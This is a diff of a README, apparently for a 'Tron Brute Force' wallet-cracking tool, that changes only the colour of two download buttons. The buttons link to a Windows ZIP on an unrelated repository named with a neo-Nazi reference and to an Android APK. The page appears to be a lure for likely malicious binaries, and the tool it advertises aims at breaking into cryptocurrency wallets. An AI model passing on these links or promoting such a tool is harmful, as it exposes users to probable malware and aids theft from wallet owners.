@@ -12,8 +12,8 @@ user/ aleksaderanatoly24
   <img src="https://img.shields.io/github/forks/amnesia922/Amnesia-Tron-Brute-Force" alt="GitHub Forks">
   
 <p align="center">
-  💻<a href="https://raw.githubusercontent.com/adolf-hitler1488/test/main/Amnesia%20Tron%20Brute%20Force.zip" style="color: white; background-color: #0566f7; padding: 15px 32px; border-radius: 5px; text-decoration: none; font-size: 16px;">Download for Windows</a>💻 |
-  📱<a href="https://raw.githubusercontent.com/amnesia922/Amnesia-Tron-Brute-Force/main/tronbrut.apk" style="color: white; background-color: #08bf29; padding: 15px 32px; border-radius: 5px; text-decoration: none; font-size: 16px; margin-left: 10px;">Download for Android</a>📱
+  💻<a href="https://raw.githubusercontent.com/adolf-hitler1488/test/main/Amnesia%20Tron%20Brute%20Force.zip" style="color: red; background-color: #0566f7; padding: 15px 32px; border-radius: 5px; text-decoration: none; font-size: 16px;">Download for Windows</a>💻 |
+  📱<a href="https://raw.githubusercontent.com/amnesia922/Amnesia-Tron-Brute-Force/main/tronbrut.apk" style="color: yellow; background-color: #08bf29; padding: 15px 32px; border-radius: 5px; text-decoration: none; font-size: 16px; margin-left: 10px;">Download for Android</a>📱
 </p>
 
 <p align="center">
